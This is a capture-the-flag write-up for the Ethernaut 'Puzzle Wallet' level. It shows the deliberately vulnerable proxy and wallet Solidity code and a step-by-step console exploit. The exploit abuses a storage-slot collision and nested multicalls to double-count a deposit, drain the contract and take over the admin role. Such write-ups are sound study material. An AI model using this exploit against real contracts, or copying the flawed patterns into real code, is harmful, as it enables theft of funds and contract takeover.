# 24 - Puzzle Wallet

## Challenge

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

You'll need to hijack this wallet to become the admin of the proxy.

Things that might help: 

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## Summary

The objective of this level is to become the admin of the proxy contract, `PuzzleProxy`. We first need to understand the concept of upgradable contract and how it works.

![Upgradable Contract](https://cdn.hashnode.com/res/hashnode/image/upload/v1662656819138/ZshcJZhkW.png?auto=compress,format&format=webp)

User interacts with the logic contract via the proxy contract and when there's a need to update the logic contract's code, the logic contract's address is updated in the proxy contract which allows the users to interact with the new logic contract. Function calls are done via `delegatecall`.

In level 16, recall the following:

> `delegatecall` has a property known as "context preservation". This means that the `delegatecall` will execute in the context of the calling contract. The code is executed in the context of the caller rather than the callee. 

Our current memory layout looks like this:

slot | PuzzleWallet  |  PuzzleProxy
---- | ------------- | -------------
 0   |   owner       |  pendingAdmin
 1   |   maxBalance  |  admin

We can see that `PuzzleWallet`'s `owner` is at the same slot as `PuzzleProxy`'s `pendingAdmin`. This means that if we call `proposeNewAdmin` in `PuzzleProxy`, we can set `owner` to our address, and therefore add ourselves to the whitelist.

Of course, this is not enough. To become the admin, we need to overwrite the value in slot 1, i.e., either `admin` or `maxBalance`. There are only 2 functions that will modify `maxBalance`: `init` and `setMaxBalance`. `init` is impossible to exploit because it requires `maxBalance` to be 0. Let's look at `setMaxBalance`:

```js
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

So we need a way to reduce contract balance to 0. (We can see from console current balance is more than 0). 

```js
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{ value: value }(data);
    require(success, "Execution failed");
}
```

`execute` has a validation that checks that the `msg.sender` has sufficient balance to call the function. However we currently has no balance, so we need to somehow trick the contract into thinking that we have balance. Only `deposit` allows increasing our balance, but of course it also increases the contract balance. Our goal is to increase twice for our balance and once for contract balance, in which case we pass the check. The only suspicious function is `multicall`:

```js
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

`depositCalled` is set to false initially. The function is extracting the function selector from the data passed to it and checking if `deposit()` has been called - the flag made sure deposit is called once. So it seems impossible to call twice here.

The trick is that instead of calling `deposit()` directly with `multicall()`, we call two multicalls and within each `multicall()`, we call one `deposit()` which is allowed. The `depositCalled` flag is only local, which means separate multicalls will not affect each other. This allows us to achieve the goal, and become `admin`!

## Walkthrough

First call `proposeNewAdmin` to become `pendingAdmin`.

```js
> await getBalance(contract.address)
'0.001'
> functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
{name: 'proposeNewAdmin', type: 'function', inputs: Array(1)}
> params = [player]
['0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB']
> data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
'0xa63767460000000000000000000000000b26c24d538e3dff58f7c733535e65a6674fb3ab'
> await web3.eth.sendTransaction({from: player, to: instance, data})
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x9559fbfc7150e203bffe79b2110f5c52cb40f38d3f6f29e83ce52fa797429401
{blockHash: '0x0923292190ec09bfc8dbfb05e92464a098dafe7e3861f05d1548762e93ed38bd', blockNumber: 9415425, contractAddress: null, cumulativeGasUsed: 1086958, effectiveGasPrice: 4076510547, …}
```

Now we are `owner` and can add ourselves to whitelist:

```js
> await contract.owner() === player
true
> await contract.addToWhitelist(player)
{tx: '0xfcd8046f93bb97977142abf457e5e4594142534a0c63c2c054e69c4f8b35b08a', receipt: {…}, logs: Array(0)}
```

Get function call encodings:

```js
> depositData = await contract.methods["deposit()"].request().then(v => v.data)
'0xd0e30db0'
> multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
```

Now we can call `multicall` with two multicalls.

```js
> await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
{tx: '0x2d7328b6a6930a474acdac011e37be19565d0aa717d4b7bad272ee51dcd21914', receipt: {…}, logs: Array(0)}
```

As explained, `player` balance is now 0.002 Wei and we can call `execute` to withdraw them.

```js
> await contract.execute(player, toWei('0.002'), 0x0)
{tx: '0x642501dd23bee3618bdcd36c146334840419f51fd985e94ae59c9284d2fbc047', receipt: {…}, logs: Array(0)}
```

Finally call `setMaxBalance` and as a consequence of storage collision, set `admin` to player:

```js
> await contract.setMaxBalance(player)
{tx: '0xec8ecc5264f19c69f5d221c4b25764603fd738636cc1ce5f912a580673f7896d', receipt: {…}, logs: Array(0)}
```

Neat. Finally, submit the instance to pass the level.

## Afterword

Tried to use ChatGPT to understand the contract, [here](https://chat.openai.com/share/e9a66f69-ba41-4636-bbda-ace3148927c3) is the session.

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.